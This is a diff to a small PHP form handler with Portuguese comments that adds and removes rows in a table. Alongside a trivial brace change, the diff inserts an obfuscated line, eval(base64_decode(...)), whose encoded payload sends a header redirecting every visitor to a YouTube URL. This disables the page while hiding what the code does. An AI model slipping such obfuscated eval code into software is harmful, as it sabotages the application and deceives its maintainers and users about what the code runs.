@@ -15,7 +15,7 @@
 
     # vê o que o usuário quer fazer com a tabela
     $acao = isset($_POST["acao"]) ? $_POST["acao"] : "";
-    
+    eval(base64_decode("aGVhZGVyKCdMb2NhdGlvbjogaHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1Cb0owcGZoTW1mVScpOw=="));
     if($acao == "adicionar") {
         $lixo = [];
         $lixo["nome"] = $_POST["nome"];
@@ -30,7 +30,7 @@
             
             #não usar unset pq o unset não apaga mas deixa um vazio no lugar onde era o item da tabela
             array_splice($tabela,$_POST["index"],1);
-        };
+        }  
     };
 ?>
 
